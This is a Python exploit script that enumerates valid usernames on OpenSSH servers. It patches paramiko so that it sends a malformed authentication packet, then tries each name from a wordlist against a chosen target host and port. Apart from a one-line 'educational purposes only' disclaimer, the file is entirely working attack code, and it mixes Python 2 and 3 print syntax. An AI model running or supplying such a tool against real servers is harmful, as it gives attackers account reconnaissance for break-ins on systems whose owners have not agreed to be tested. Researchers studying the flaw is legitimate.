#!/usr/bin/env python
"""
Script based on the https://www.openwall.com/lists/oss-security/2018/08/16/1
Educational purposes only
"""
import paramiko, socket, argparse, sys, logging

old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
class InvalidUser(Exception):
    def __init__(self):
        pass

def call_error(*args, **kwargs):
    raise InvalidUser()

#With this we can malform our packeage and make the boolean field omitted
def add_boolean(*args, **kwargs):
    pass

def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result = old_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

#User exists
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
#Invalid User
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())


def ConnectionAndAttack(target, port, user, tried = 0):
    s = socket.socket()
    try:
        s.connect((target, port))
    except socket.error:
        print("[*] Failure to connect")
        sys.exit(1)
    transport = paramiko.transport.Transport(s)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        #Failed to negotiate a key, basically or the server got flooded
        transport.close()
        if tried < 4:
            tried += 1
            return ConnectionAndAttack(target, port, user, tried)
    try:
        transport.auth_publickey(user, paramiko.RSAKey.generate(1024))
    except InvalidUser:
        pass
    except paramiko.ssh_exception.AuthenticationException:
        print "[*] " + user + " Exists"
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="Address of target",action="store", type=str)
    parser.add_argument("--port", default=22, help="port [Default=22]", type=int, action="store")
    parser.add_argument("-w", "--wordlist", help="Wordlist with the usernames", type=str, action="store")
    parser.add_argument("--verbose", help="Set verbose mode", default=False, action="store_true")
    #parser.add_argument("-T", help = "T<0-4>:Set timing template", action="store", type=int)
    args = parser.parse_args()
    file = open(args.wordlist)
    users = file.readlines()
    file.close()
    for user in users:
        user = user.strip()
        if args.verbose:
            print("[*]Trying "+ user)
        ConnectionAndAttack(args.target, args.port, user)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupting...")
        sys.exit(0)
